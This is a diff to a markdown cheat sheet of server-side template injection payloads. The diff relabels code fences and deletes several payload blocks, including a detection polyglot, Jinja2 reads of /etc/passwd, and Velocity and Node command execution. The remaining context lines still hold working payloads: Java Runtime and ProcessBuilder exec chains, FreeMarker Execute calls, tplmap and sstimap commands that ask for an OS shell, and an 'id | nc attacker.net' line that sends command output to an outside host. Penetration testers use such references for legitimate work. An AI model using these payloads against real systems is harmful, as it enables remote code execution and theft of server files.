@@ -4,6 +4,7 @@ date = '2023-06-21'
 description = 'All about server-side template injection techniques, methods, payloads, how/why/when they work.'
 include_toc = 'true'
 +++
+
 # Server Side Template Injection
 
 > Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
@@ -93,7 +94,7 @@ Recommended tools:
 
 e.g:
 
-```powershell
+```python
 python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
@@ -103,7 +104,7 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 e.g:
 
-```powershell
+```python
 python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
 python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
 python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
@@ -114,14 +115,6 @@ python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV
 ![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)
 
 ---
-## Detection
-
-In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :
-
-```
-${{<%[%'"}}%\.
-```
-
 ## ASP.NET Razor
 
 [Official website](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)
@@ -147,18 +140,6 @@ ${{<%[%'"}}%\.
 
 [Official website](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html)
 > Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0
-
-### Expression Language EL - Basic injection
-
-```java
-${<property>}
-${1+1}
-
-#{<expression string>}
-#{1+1}
-
-T(<javaclass>)
-```
 
 ### Expression Language EL - Properties
 
@@ -190,10 +171,6 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 ''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
 ''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()
 
-// Method using Runtime
-#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
-#{session.getAttribute("rtc").setAccessible(true)}
-#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
 
 // Method using process builder
 ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
@@ -247,7 +224,6 @@ Convert the returned bytes to ASCII
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ${"freemarker.template.utility.Execute"?new()("id")}
-#{"freemarker.template.utility.Execute"?new()("id")}
 [="freemarker.template.utility.Execute"?new()("id")]
 ```
 
@@ -355,10 +331,6 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 = x.exec('id | nc attacker.net 80')
 ```
 
-```javascript
-#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
-```
-
 ---
 
 ## Java
@@ -398,7 +370,6 @@ Django template language supports 2 rendering engines by default: Django Templat
 
 
 ```python
-{% csrf_token %} # Causes error with Jinja2
 {{ 7*7 }}  # Error with Django Templates
 ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 ```
@@ -512,16 +483,6 @@ Access `__globals__` and `__builtins__`:
     <dt>{{ key|e }}</dt>
     <dd>{{ value|e }}</dd>
 {% endfor %}
-```
-
-### Jinja2 - Read remote file
-
-```python
-# ''.__class__.__mro__[2].__subclasses__()[40] = File class
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
-# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
-{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
 ### Jinja2 - Write into remote file
@@ -879,12 +840,6 @@ ERB:
 <%= 7 * 7 %>
 ```
 
-Slim:
-
-```ruby
-#{ 7 * 7 }
-```
-
 ### Ruby - Retrieve /etc/passwd
 
 ```ruby
@@ -1003,17 +958,6 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 [Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
 > Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
-
-```python
-#set($str=$class.inspect("java.lang.String").type)
-#set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$str.valueOf($chr.toChars($out.read()))
-#end
-```
 
 ---
 
